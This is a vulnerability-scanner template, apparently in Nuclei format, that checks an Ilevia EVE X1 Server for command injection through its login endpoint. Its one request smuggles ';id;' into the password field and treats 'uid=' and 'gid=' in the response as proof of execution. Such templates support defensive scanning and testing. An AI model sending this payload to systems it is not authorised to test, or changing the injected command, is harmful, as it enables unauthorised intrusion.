id: IleviaEVEX1Server-login-RCE

info:
  name: IleviaEVEX1Server-login-RCE
  author: iSee857
  severity: info
  description: |
    IleviaEVEX1Server-login-RCE.
  tags: RCE

http:
  - raw:
      - |
        POST /ajax/php/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 84

        userid=george&passwd=;id;

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
          - '"err":1'
        condition: and